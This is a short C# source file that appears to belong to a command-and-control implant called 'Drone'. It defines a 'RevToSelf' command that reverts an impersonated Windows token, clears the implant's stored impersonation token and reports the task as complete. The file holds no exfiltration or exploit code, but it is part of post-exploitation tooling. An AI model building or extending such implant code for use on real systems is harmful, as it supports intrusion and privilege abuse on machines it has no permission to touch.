using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class RevToSelf : DroneCommand
{
    public override byte Command => 0x16;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (!Win32.RevertToSelf())
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        Drone.ImpersonationToken = IntPtr.Zero;
        await Drone.SendTaskComplete(task);
    }
}